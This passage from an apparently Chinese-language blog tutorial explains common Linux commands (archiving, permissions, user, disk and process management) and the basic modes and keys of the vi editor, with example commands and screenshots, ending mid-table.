<li>-l，取消遇见特殊字元 ^L（送纸字元）时会暂停的功能；</li>
<li>-f，计算行数时，以实际上的行数，而非自动换行过后的行数（有些单行字数太长的会被扩展为两行或两行以上）；</li>
<li>-p，不以卷动的方式显示每一页，而是先清除萤幕后再显示内容；</li>
<li>-c，跟-p相似，不同的是先显示内容再清除其他旧资料；</li>
<li>-s，当遇到有连续两行以上的空白行，就代换为一行的空白行；</li>
<li>-u，不显示下引号 （根据环境变数 TERM 指定的 terminal 而有所不同）；</li>
<li>+/pattern，在每个文档显示前搜寻该字串（pattern），然后从该字串之后开始显示；</li>
<li>+num，从第 num 行开始显示；</li>
<li>fileNames，欲显示内容的文档，可为复数个数；</li>
</ul>
</li>
<li><p>实例如下：</p>
<ul>
<li>more mine.txt       //打开mine.txt文件<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image184.jpg" alt="img"></li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 id="文档备份与压缩命令"><a href="#文档备份与压缩命令" class="headerlink" title="文档备份与压缩命令"></a>文档备份与压缩命令</h3><ol>
<li><p>tar命令</p>
<ul>
<li><p><strong>tar [</strong> <strong>主选项+辅选项] 文件或者目录</strong></p>
<p>用于备份文件；</p>
<p>主选项包括：</p>
<ul>
<li>-A，新增文件到已存在的备份文件；</li>
<li>-B，读取数据时重设区块大小；</li>
<li>-c，建立新的备份文件；</li>
<li>-d，对比备份文件内和文件系统上的文件的差异； </li>
<li>-g，处理GNU格式的大量备份；</li>
<li>-G，处理旧的GNU格式的大量备份； </li>
<li>-i，忽略备份文件中的0 Byte区块，也就是EOF；</li>
<li>-j，支持bzip2解压文件；</li>
<li>-k，解开备份文件时，不覆盖已有的文件； </li>
<li>-l，复制的文件或目录存放的文件系统，必须与tar指令执行时所处的文件系统相同，否则不予复制；</li>
<li>-m，还原文件时，不变更文件的更改时间；</li>
<li>-r，添加文件到已经压缩的文件；</li>
<li>-t，显示压缩文件的内容；</li>
<li>-u，添加改变了和现有的文件到已经存在的压缩文件；</li>
<li>-v，显示操作过程；</li>
<li>-W，确认压缩文件的正确性；</li>
<li>-x，从压缩的文件中提取文件；</li>
<li>-z，支持compress解压文件；</li>
</ul>
<p>辅选项包括</p>
<ul>
<li>-b&lt;区块数目&gt;，设置每笔记录的区块数目，每个区块大小为12Bytes；</li>
<li>-C，切换到指定目录</li>
<li>-f，指定压缩文件</li>
</ul>
</li>
<li><p>实例如下：</p>
<ul>
<li>tar -cvf data.tar *         //将目录下的所有文件打包成data.tar；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image186.jpg" alt="img"></li>
<li>tar -cvzf data.tar.gz *          //将目录下的所有文件打包成data.tar.gz；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image188.jpg" alt="img"></li>
<li>tar -tvf data.tar            //查看data.tar中文件：所属权限、用户名用户组、日期等<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image190.jpg" alt="img"></li>
<li>tar -xvf data.tar    //解压data.tar包<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image192.jpg" alt="img"></li>
</ul>
</li>
</ul>
</li>
<li><p>gzip命令</p>
<ul>
<li><p>**gzip [**<strong>选项] 压缩(解压缩)的文件名</strong></p>
<p>gzip是个使用广泛的压缩程序，文件经它压缩过后，其名称后面会多出”.gz”的扩展名</p>
<p>选项包括：</p>
<ul>
<li>-a，使用ASCII文字模式；</li>
<li>-c，把压缩后的文件输出到标准输出设备，不去变动原始文件；</li>
<li>-d，解开压缩文件；</li>
<li>-r，递归处理，将指定目录下的所有文件及子目录一并处理；</li>
<li>-f，强行压缩文件。不理会文件名称或硬连接是否存在以及该文件是否为符号连接；</li>
<li>-l，列出压缩文件的相关信息；</li>
<li>-n，压缩文件时，不保存原来的文件名称及时间戳记；</li>
<li>-N，压缩文件时，保存原来的文件名称及时间戳记；</li>
<li>-q，不显示警告信息；</li>
<li>-S&lt;压缩字尾字符串&gt;，更改压缩字尾字符串；</li>
<li>-t，测试压缩文件是否正确无误；</li>
<li>-v，显示指令执行过程；</li>
<li>-V，显示版本信息；</li>
<li>-L，显示版本与版权信息；</li>
<li>-num，用指定的数字num调整压缩的速度，-1或–fast表示最快压缩方法（低压缩比），-9或–best表示最慢压缩方法（高压缩比），系统缺省值为6；</li>
<li>-h，在线帮助；</li>
</ul>
</li>
<li><p>实例如下：</p>
<ul>
<li>gzip –best mine.txt    //高压缩比压缩mine.txt文件；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image194.jpg" alt="img"></li>
<li>gzip -l mine.txt.gz //列出mine.txt.gz相关信息；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image196.jpg" alt="img"></li>
<li>gzip -d mine.txt.gz             //解压缩mine.txt.gz；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image198.jpg" alt="img"></li>
</ul>
</li>
</ul>
</li>
<li><p>unzip命令</p>
<ul>
<li><p>**unzip [**<strong>选项] 压缩文件名.zip</strong></p>
<p>用于解压缩zip文件;</p>
<p>选项包括：</p>
<ul>
<li>-c，将解压缩的结果显示到屏幕上，并对字符做适当的转换；</li>
<li>-f，更新现有的文件；</li>
<li>-l，显示压缩文件内所包含的文件；</li>
<li>-p，与-c参数类似，会将解压缩的结果显示到屏幕上，但不会执行任何的转换；</li>
<li>-t，检查压缩文件是否正确；</li>
<li>-u，与-f参数类似，但是除了更新现有的文件外，也会将压缩文件中的其他文件解压缩到目录中；</li>
<li>-v，执行是时显示详细的信息；</li>
<li>-z，仅显示压缩文件的备注文字；</li>
<li>-a，对文本文件进行必要的字符转换；</li>
<li>-b，不要对文本文件进行字符转换；</li>
<li>-C, 压缩文件中的文件名称区分大小写;</li>
<li>-j, 不处理压缩文件中原有的目录路径；</li>
<li>-L，将压缩文件中的全部文件名改为小写；</li>
<li>-M，将输出结果送到more程序处理；</li>
<li>-n，解压缩时不要覆盖原有的文件；</li>
<li>-o，不必先询问用户，unzip执行后覆盖原有文件；</li>
<li>-P&lt;密码&gt;，使用zip的密码选项；</li>
<li>-q，执行时不显示任何信息；</li>
<li>-s，将文件名中的空白字符转换为底线字符；</li>
<li>-V，保留VMS的文件版本信息；</li>
<li>-X，解压缩时同时回存文件原来的UID/GID；</li>
<li>-d&lt;目录&gt;，指定文件解压缩后所要存储的目录；</li>
<li>-x&lt;文件&gt;，指定不要处理.zip压缩文件中的哪些文件；</li>
</ul>
</li>
<li><p>示例如下：</p>
<ul>
<li>unzip tree.zip -d mine //将tree.zip解压到mine目录；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image200.jpg" alt="img"></li>
<li>unzip -j tree.zip    //解压tree.zip到tree.zip同一目录下，不新建目录；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image202.jpg" alt="img"></li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 id="Linux权限改变命令"><a href="#Linux权限改变命令" class="headerlink" title="Linux权限改变命令"></a>Linux权限改变命令</h3><ol>
<li><p>chmod [操作符] [mode] 文件名</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image204.jpg" alt="img"></p>
<p>Linux下文件的权限类型一般包括读，写，执行。对应字母为 r、w、x；<br>Linux下权限的属组有 拥有者 、群组 、其它组 三种。每个文件都可以针对这三个属组（粒度），设置不同的rwx(读写执行)权限。通常情况下，一个文件只能归属于一个用户和组， 如果其它的用户想有这个文件的权限，则可以将该用户加入具备权限的群组，一个用户可以同时归属于多个组；</p>
<ul>
<li>常见的权限表示形式有：<ul>
<li>-rw——- (600)      只有拥有者有读写权限。</li>
<li>-rw-r–r– (644)      只有拥有者有读写权限；而属组用户和其他用户只有读权限。</li>
<li>-rwx—— (700)     只有拥有者有读、写、执行权限。</li>
<li>-rwxr-xr-x (755)    拥有者有读、写、执行权限；而属组用户和其他用户只有读、执行权限。</li>
<li>-rwx–x–x (711)    拥有者有读、写、执行权限；而属组用户和其他用户只有执行权限。</li>
<li>-rw-rw-rw- (666)   所有用户都有文件读、写权限。</li>
<li>-rwxrwxrwx (777)  所有用户都有读、写、执行权限。</li>
</ul>
</li>
<li>示例如下：<ul>
<li>chmod o+w file5         //表示其他人增加对file5的写权限<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image206.jpg" alt="img"></li>
<li>chmod g=x file5          //表示群体可以执行file5；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image208.jpg" alt="img"></li>
<li>chmod go-rwx file6            //表示拥有者、群体减少对file6的读写执行权限；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image210.jpg" alt="img"></li>
<li>chmod 751 file6           //表示拥有者为rwx，群体为rx，其他人为x权限；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image212.jpg" alt="img"></li>
</ul>
</li>
</ul>
</li>
<li><p>chgrp [选项] 组 文件</p>
<p>​    用于变更文件或目录的所属群组;</p>
<ul>
<li>​    选项包括：<ul>
<li>-c，效果类似”-v”参数，但仅回报更改的部分；</li>
<li>-f，不显示错误信息；</li>
<li>-h，只对符号连接的文件作修改，而不更动其他任何相关文件；</li>
<li>-R，递归处理，将指定目录下的所有文件及子目录一并处理；</li>
<li>-v，显示指令执行过程；</li>
</ul>
</li>
<li>实例如下：<ul>
<li>chgrp leeyuxun file6     //将file6的用户组权限改为leeyuxun;<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image214.jpg" alt="img"></li>
</ul>
</li>
</ul>
</li>
<li><p>chown [选项] 用户或组 文件</p>
<p>​    将指定文件的拥有者改为指定的用户或组;</p>
<ul>
<li>选项包括：<ul>
<li>-c，显示更改的部分的信息</li>
<li>-f，忽略错误信息</li>
<li>-h，修复符号链接</li>
<li>-v，显示详细的处理信息</li>
<li>-R，处理指定目录以及其子目录下的所有文件</li>
</ul>
</li>
<li>实例如下：<ul>
<li>chown leeyuxun file6   //将file6的拥有者改为leeyuxun；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image216.jpg" alt="img"></li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 id="Linux与用户有关的命令"><a href="#Linux与用户有关的命令" class="headerlink" title="Linux与用户有关的命令"></a>Linux与用户有关的命令</h3><ol>
<li><p>passwd [-k] [-l] [-u [-f]] [-d] [-S] [用户名]</p>
<p>​    更改用户密码；</p>
<ul>
<li>​    参数含义：<ul>
<li>-d，删除密码；</li>
<li>-f，强制执行；</li>
<li>-k，更新只能发送再过期之后；</li>
<li>-l，停止账号使用；</li>
<li>-S，显示密码信息；</li>
<li>-u，启用已被停止的账户；</li>
<li>-x，设置密码的有效期；</li>
<li>-g，修改群组密码；</li>
<li>-i，过期后停止用户账号；</li>
</ul>
</li>
<li>实例如下：<ul>
<li>passwd -S leeyuxun     //显示用户leeyuxun的密码信息；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image218.jpg" alt="img"></li>
</ul>
</li>
</ul>
</li>
<li><p>su [-fmp] [-c command] [-s shell] [–help] [–version] [-] [使用者账号]</p>
<p>​    用于变更为其他使用者的身份，除 root 外，需要键入该使用者的密码。使用权限：所有使用者。</p>
<ul>
<li>参数说明：<ul>
<li>-f，不必读启动档（如 csh.cshrc 等），仅用于 csh 或 tcsh；</li>
<li>-m -p，执行 su 时不改变环境变数；</li>
<li>-c command，变更为帐号为 USER 的使用者并执行指令（command）后再变回原来使用者；</li>
<li>-s shell，指定要执行的 shell （bash csh tcsh 等），预设值为 /etc/passwd 内的该使用者（USER） shell；</li>
</ul>
</li>
<li>实例如下：<ul>
<li>su root          //更换为root账号；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image220.jpg" alt="img"></li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 id="Linux系统管理命令"><a href="#Linux系统管理命令" class="headerlink" title="Linux系统管理命令"></a>Linux系统管理命令</h3><ol>
<li><p>write 用户账号 [终端名称]</p>
<p>​    用于传讯息给其他使用者。使用权限：所有使用者。</p>
<ul>
<li>参数说明：<ul>
<li>用户账号：预备传讯息的使用者帐号；</li>
<li>终端名称：如果使用者同时有两个以上的 tty 连线，可以自行选择合适的 tty 传讯息；</li>
</ul>
</li>
</ul>
</li>
<li><p>mesg [y/n]</p>
<p>​    用于设置终端机的写入权限；</p>
<ul>
<li>参数如下：<ul>
<li>n，不允许其他用户将信息直接显示在你的屏幕上；</li>
<li>y，允许其他用户将信息直接显示在你的屏幕上；</li>
</ul>
</li>
</ul>
</li>
<li><p>free  [-b | -k | -m]</p>
<p>​        用于显示内存状态。free指令会显示内存的使用情况，包括实体内存，虚拟的交换文件内存，共享内存区段，以及系统核心使用的缓冲区等。</p>
<ul>
<li>参数如下：<ul>
<li>-b，以Byte为单位显示内存使用情况。</li>
<li>-k，以KB为单位显示内存使用情况。</li>
<li>-m，以MB为单位显示内存使用情况。</li>
</ul>
</li>
<li>实例如下：<ul>
<li>free -k           //以kb显示内存<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image222.jpg" alt="img"></li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 id="Linux磁盘管理命令"><a href="#Linux磁盘管理命令" class="headerlink" title="Linux磁盘管理命令"></a>Linux磁盘管理命令</h3><ol>
<li><p>df  [选项] [文件]</p>
<p>​    命令用于显示目前在Linux系统上的文件系统的磁盘使用情况统计；</p>
<ul>
<li>选项包括：<ul>
<li>-a，包含所有的具有 0 Blocks 的文件系统；</li>
<li>–block-size={SIZE}，使用{SIZE}大小的Blocks；</li>
<li>-h，使用人类可读的格式(预设值是不加这个选项的…)；</li>
<li>-H，很像 -h, 但是用 1000 为单位而不是用 1024；</li>
<li>-i，列出 inode 资讯，不列出已使用 block；</li>
<li>-k，就像是 –block-size=1024；</li>
<li>-l，限制列出的文件结构；</li>
<li>-m，就像 –block-size=1048576；</li>
<li>-P，使用 POSIX 输出格式；</li>
<li>-t，限制列出文件系统的TYPE；</li>
<li>-T，显示文件系统的形式；</li>
<li>-x，限制列出文件系统不要显示 TYPE；</li>
</ul>
</li>
<li>实例如下：<ul>
<li>df -aT     //显示目录下包含所有的具有 0 Blocks 的文件系统，及其系统形式；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image224.jpg" alt="img"></li>
<li>df -t ext4              //只显示ext4类型的文件系统；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image226.jpg" alt="img"></li>
</ul>
</li>
</ul>
</li>
<li><p>du [选项] [目录名或文件名] </p>
<p>​    用于显示目录或文件的大小；</p>
<ul>
<li>选项包括：<ul>
<li>-a，显示目录中个别文件的大小；</li>
<li>-b，显示目录或文件大小时，以byte为单位；</li>
<li>-c，除了显示个别目录或文件的大小外，同时也显示所有目录或文件的总和；</li>
<li>-D，显示指定符号连接的源文件大小；</li>
<li>-h，以K，M，G为单位，提高信息的可读性；</li>
<li>-H，与-h参数相同，但是K，M，G是以1000为换算单位；</li>
<li>-k，以1024 bytes为单位；</li>
<li>-l，重复计算硬件连接的文件</li>
<li>-L&lt;符号连接&gt;，显示选项中所指定符号连接的源文件大小；</li>
<li>-m，以1MB为单位；</li>
<li>-s，仅显示总计；</li>
<li>-S，显示个别目录的大小时，并不含其子目录的大小；</li>
<li>-x，以一开始处理时的文件系统为准，若遇上其它不同的文件系统目录则略过</li>
<li>-X&lt;文件&gt;，在&lt;文件&gt;指定目录或文件；</li>
</ul>
</li>
<li>实例如下：<ul>
<li>du –a /          //显示目录下所有文件大小；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image228.jpg" alt="img"></li>
<li>du -s leeyuxun            //显示属于leeyuxun的文件总数；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image230.jpg" alt="img"></li>
</ul>
</li>
</ul>
</li>
<li><p>dd [选项]</p>
<p>​    用于读取、转换并输出数据；</p>
<ul>
<li>选项如下：<ul>
<li>if=文件名，输入文件名，默认为标准输入。即指定源文件。</li>
<li>of=文件名，输出文件名，默认为标准输出。即指定目的文件。</li>
<li>ibs=bytes，一次读入bytes个字节，即指定一个块大小为bytes个字节。</li>
<li>obs=bytes，一次输出bytes个字节，即指定一个块大小为bytes个字节。</li>
<li>bs=bytes，同时设置读入/输出的块大小为bytes个字节。</li>
<li>cbs=bytes，一次转换bytes个字节，即指定转换缓冲区大小。</li>
<li>skip=blocks，从输入文件开头跳过blocks个块后再开始复制。</li>
<li>seek=blocks，从输出文件开头跳过blocks个块后再开始复制。</li>
<li>count=blocks，仅拷贝blocks个块，块大小等于ibs指定的字节数。</li>
</ul>
</li>
<li>实例如下：<ul>
<li>dd if=/dev/fd of=/dev/fd1 bs=5120         //将dev下的fd复制到fd1中，设置输入块大小为5120字节；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image232.jpg" alt="img"></li>
</ul>
</li>
</ul>
</li>
<li><p>fdformat [−n] 设备名</p>
<p>​    用于对指定的软碟机装置进行低阶格式化；</p>
<p>​    -n，关闭确认功能。这个选项会关闭格式化之后的确认步骤；</p>
</li>
</ol>
<h3 id="Linux进程管理命令"><a href="#Linux进程管理命令" class="headerlink" title="Linux进程管理命令"></a>Linux进程管理命令</h3><ol>
<li><p>at [选项] 时间 </p>
<p>​    设置在指定时间执行指定的命令；</p>
<ul>
<li>选项包括：<ul>
<li>-l，显示等待执行的调度作业；</li>
<li>-d，删除指定的调度作业；</li>
<li>-v，显示作业执行的时间；</li>
<li>-m，作业结束后发送邮件给执行的at命令的用户；</li>
</ul>
</li>
</ul>
</li>
<li><p>bg，fg</p>
<p>​    前后台切换；</p>
<ul>
<li>前台作业切换到后台运行：bg [作业号]；</li>
<li>后台作业切换到前台运行：fg [作业号]；</li>
<li>显示当前所有作业：jobs [选项]；</li>
</ul>
</li>
<li><p>ps [选项]</p>
<p>​    显示系统中当前的进程及其状态;</p>
<ul>
<li>选项包括：<ul>
<li>-a，显示当前终端上所有用户的进程；</li>
<li>-e，显示所有进程的信息；</li>
<li>-f，显示完整格式的输出；</li>
<li>-l，显示进程的详细信息，包括父进程号、登录的终端号、进程优先级等；</li>
<li>-u，显示指定用户的所有进程；</li>
<li>-C &lt;命令&gt;，列出指定命令的状况；</li>
<li>-x，显示后台进程的信息；</li>
<li>-t &lt;终端号&gt;，显示指定终端上的进程信息；</li>
</ul>
</li>
<li>实例如下：<ul>
<li>ps          //列出所有进程<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image234.jpg" alt="img"></li>
</ul>
</li>
</ul>
</li>
<li><p>pstree [选项]</p>
<p>​    树形图形显示进程之间的相互关系;</p>
<ul>
<li>选项包括<ul>
<li>-a，显示启动进程的命令行；</li>
<li>-n，按照进程号进行排序；</li>
<li>-p，显示进程号；</li>
</ul>
</li>
<li>实例如下：<ul>
<li>pstree -p              //列出进程树，并显示进程号；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image236.jpg" alt="img"></li>
</ul>
</li>
</ul>
</li>
<li><p>kill命令</p>
<p><strong>kill [-s &lt;****信息名称或编号&gt;] [程序]或kill [-l &lt;信息编号&gt;]</strong></p>
<ul>
<li>参数说明：<ul>
<li>-l &lt;信息编号&gt;，若不加&lt;信息编号&gt;选项，则-l参数会列出全部的信息名称；</li>
<li>-s &lt;信息名称或编号&gt;，指定要送出的信息；</li>
<li>[程序]，可以是程序的PID或是PGID，也可以是工作编号；</li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 id="Linux其他命令"><a href="#Linux其他命令" class="headerlink" title="Linux其他命令"></a>Linux其他命令</h3><ol>
<li><p>echo [-n] 字符串 </p>
<p>​    输出字符串；</p>
<ul>
<li>-n，不在末尾换行；</li>
<li>示例显示：<ul>
<li>echo Hello world!        //打印字符串“Hello world!”<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image238.jpg" alt="img"></li>
</ul>
</li>
</ul>
</li>
<li><p>cal [选项] [月份] [年]</p>
<p>​    用于查看日历信息；</p>
<ul>
<li>实例如下：<ul>
<li>cal 9 2019            //打印2019年9月日历；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image240.jpg" alt="img"></li>
</ul>
</li>
</ul>
</li>
<li><p>date [选项] +显示时间格式</p>
<p>​    用来显示或设定系统的日期与时间;</p>
<ul>
<li>选项包括：<ul>
<li>-d&lt;字符串&gt;：显示字符串所指的日期与时间。字符串前后必须加上双引号； </li>
<li>-s&lt;字符串&gt;：根据字符串来设置日期与时间。字符串前后必须加上双引号； </li>
<li>-u：显示GMT；</li>
</ul>
</li>
<li>实例如下：<ul>
<li>date 08211550            //显示8月21日15:50;<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image242.jpg" alt="img"></li>
</ul>
</li>
</ul>
</li>
<li><p>clear</p>
<p>​    用于清除屏幕;</p>
</li>
</ol>
<h2 id="Vi的熟悉与使用"><a href="#Vi的熟悉与使用" class="headerlink" title="Vi的熟悉与使用"></a>Vi的熟悉与使用</h2><p>vi共分为三种模式：分别是<strong>命令模式（Command mode）</strong>，<strong>插入模式（Insert mode）</strong>和<strong>末行模式（Last line mode）</strong></p>
<h3 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h3><p>用户刚刚启动vi，即可进入命令模式。</p>
<p>此状态下敲击键盘动作会被vi识别为命令，而非输入字符。比如我们此时按下i，并不会输入一个字符，i被当作了一个命令。</p>
<p>以下是常用的几个命令：</p>
<ul>
<li>i，切换到插入模式，以输入字符;</li>
<li>x，删除当前光标所在处的字符;</li>
<li>:，切换到末行模式，以在最底一行输入命令</li>
</ul>
<p>若想要编辑文本：启动vi，进入了命令模式，按下i，切换到插入模式；</p>
<p>命令模式只有一些最基本的命令，因此仍要依靠末行模式输入更多命令；</p>
<h3 id="插入模式"><a href="#插入模式" class="headerlink" title="插入模式"></a>插入模式</h3><p>在命令模式下按下i就进入了插入模式。</p>
<p>在插入模式中，可以使用以下按键：</p>
<ul>
<li><strong>字符按键以及Shift组合</strong>，输入字符；</li>
<li><strong>ENTER</strong>，回车键，换行；<strong>BACK SPACE</strong>，退格键，删除光标前一个字符；</li>
<li><strong>DEL</strong>，删除键，删除光标后一个字符；<strong>方向键</strong>，在文本中移动光标；</li>
<li><strong>HOME</strong>/<strong>END</strong>，移动光标到行首/行尾；</li>
<li><strong>Page Up</strong>/<strong>Page Down</strong>，上/下翻页；</li>
<li><strong>Insert</strong>，切换光标为输入/替换模式，光标将变成竖线/下划线；</li>
<li><strong>ESC</strong>，退出插入模式，切换到命令模式；</li>
</ul>
<h3 id="末行模式"><a href="#末行模式" class="headerlink" title="末行模式"></a>末行模式</h3><p>在命令模式下按下:（英文冒号）进入末行模式。</p>
<p>末行模式可以输入单个或多个字符的命令，可用的命令非常多。</p>
<p>在末行模式中，基本的命令有（已经省略了冒号）：</p>
<ul>
<li><p>q，退出程序；</p>
</li>
<li><p>w，保存文件</p>
</li>
</ul>
<p>按ESC键可随时退出末行模式；</p>
<h3 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h3><ol>
<li>使用命令vi mine.txt，新建txt文件，并打开进入命令模式；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image244.jpg" alt="img"><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image246.jpg" alt="img"></li>
<li>按下i，进入插入模式，开始编辑文字；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image248.jpg" alt="img"></li>
<li>按下esc，回到命令模式，在命令模式中按下:wq，保存并离开，如果只输入:q，是直接离开，不保存；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image250.jpg" alt="img"></li>
</ol>
<h3 id="命令说明"><a href="#命令说明" class="headerlink" title="命令说明"></a>命令说明</h3><ol>
<li><p>命令模式可用的光标移动、复制粘贴、搜索替换等按钮</p>
<ol>
<li><p>移动光标的方法</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>h 或 向左箭头键(←)</td>
<td>光标向左移动一个字符</td>
</tr>
<tr>
<td>j 或 向下箭头键(↓)</td>
<td>光标向下移动一个字符</td>
</tr>
<tr>
<td>k 或 向上箭头键(↑)</td>
<td>光标向上移动一个字符</td>
</tr>
<tr>
<td>l 或 向右箭头键(→)</td>
<td>光标向右移动一个字符</td>
</tr>
<tr>
<td>如向下移动 30 行，可以使用 “30j” 或 “30↓” 的组合按键</td>
<td></td>
</tr>
<tr>
<td>[Ctrl] + [f]</td>
<td>屏幕『向下』移动一页，相当于   [Page Down]按键 (常用)</td>
</tr>
<tr>
<td>[Ctrl] + [b]</td>
<td>屏幕『向上』移动一页，相当于 [Page Up] 按键 (常用)</td>
</tr>
<tr>
<td>[Ctrl] + [d]</td>
<td>屏幕『向下』移动半页</td>
</tr>
<tr>
<td>[Ctrl] + [u]</td>
<td>屏幕『向上』移动半页</td>
</tr>
<tr>
<td>+</td>
<td>光标移动到非空格符的下一行</td>
</tr>
<tr>
<td>-</td>
<td>光标移动到非空格符的上一行</td>
</tr>
<tr>
<td>n<space></td>
<td>n 表示『数字』，按下数字后再按空格键，光标会向右移动这一行的 n 个字符。例如 20<space> 则光标会向后面移动 20 个字符距离。</td>
</tr>
<tr>
<td>0 或功能键[Home]</td>
<td>移动到这一行的最前面字符处   (常用)</td>
</tr>
<tr>
<td>$ 或功能键[End]</td>
<td>移动到这一行的最后面字符处(常用)</td>
</tr>
<tr>
<td>H</td>
<td>光标移动到这个屏幕的最上方那一行的第一个字符</td>
</tr>
<tr>
<td>M</td>
<td>光标移动到这个屏幕的中央那一行的第一个字符</td>
</tr>
<tr>
<td>L</td>
<td>光标移动到这个屏幕的最下方那一行的第一个字符</td>
</tr>
<tr>
<td>G</td>
<td>移动到这个档案的最后一行(常用)</td>
</tr>
<tr>
<td>nG</td>
<td>移动到这个档案的第 n 行。例如 20G 则会移动到这个档案的第 20 行(可配合 :set nu)</td>
</tr>
<tr>
<td>gg</td>
<td>移动到这个档案的第一行，相当于 1G</td>
</tr>
<tr>
<td>N<Enter></td>
<td>光标向下移动 n 行(常用)</td>
</tr>
</tbody></table>
</li>
<li><p>复制、粘贴、删除</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>X，x</td>
<td>在一行字当中，x 为向后删除一个字符 (相当于 [del] 按键)， X 为向前删除一个字符(相当于   [backspace] 亦即是退格键) (常用)</td>
</tr>
<tr>
<td>nx</td>
<td>连续向后删除 n 个字符</td>
</tr>
<tr>
<td>dd</td>
<td>删除游标所在的那一整行(常用)</td>
</tr>
<tr>
<td>ndd</td>
<td>删除光标所在的向下 n 行</td>
</tr>
<tr>
<td>d1G</td>
<td>删除光标所在到第一行的所有数据</td>
</tr>
<tr>
<td>dG</td>
<td>删除光标所在到最后一行的所有数据</td>
</tr>
<tr>
<td>d$</td>
<td>删除游标所在处，到该行的最后一个字符</td>
</tr>
<tr>
<td>d0</td>
<td>那个是数字的 0 ，删除游标所在处，到该行的最前面一个字符</td>
</tr>
<tr>
<td>yy</td>
<td>复制游标所在的那一行(常用)</td>
</tr>
<tr>
<td>nyy</td>
<td>复制光标所在的向下 n 行</td>
</tr>
<tr>
<td>y1G</td>
<td>复制游标所在行到第一行的所有数据</td>
</tr>
<tr>
<td>yG</td>
<td>复制游标所在行到最后一行的所有数据</td>
</tr>
<tr>
<td>y0</td>
<td>复制光标所在的那个字符到该行行首的所有数据</td>
</tr>
<tr>
<td>Y$</td>
<td>复制光标所在的那个字符到该行行尾的所有数据</td>
</tr>
<tr>
<td>P，p</td>
<td>p 为将已复制的数据在光标下一行贴上，P 则为贴在游标上一行</td>
</tr>
<tr>
<td>J</td>
<td>将光标所在行与下一行的数据结合成同一行</td>
</tr>
<tr>
<td>c</td>
<td>重复删除多个数据，例如向下删除 10 行，[ 10cj ]</td>
</tr>
<tr>
<td>u</td>
<td>复原前一个动作</td>
</tr>
<tr>
<td>[Ctrl]+r</td>
<td>重做上一个动作</td>
</tr>
<tr>
<td>.</td>
<td>重复前一个动作</td>
</tr>
</tbody></table>
</li>
<li><p>搜索、替换</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>/word</td>
<td>向光标之下寻找一个名称为   word 的字符串</td>
</tr>
<tr>
<td>?word</td>
<td>向光标之上寻找一个字符串名称为 word 的字符串</td>
</tr>
<tr>
<td>n</td>
<td>重复前一个搜寻的动作</td>
</tr>
<tr>
<td>N</td>
<td>『反向』进行前一个搜寻动作</td>
</tr>
<tr>
<td>:n1,n2s/word1/word2/g</td>
<td>在第 n1 与 n2 行之间寻找 word1 这个字符串，并将该字符串取代为 word2</td>
</tr>
<tr>
<td>:1,$s/word1/word2/g 或 :%s/word1/word2/g</td>
<td>从第一行到最后一行寻找   word1 字符串，并将该字符串取代为 word2</td>
</tr>
<tr>
<td>:1,$s/word1/word2/gc 或 :%s/word1/word2/gc</td>
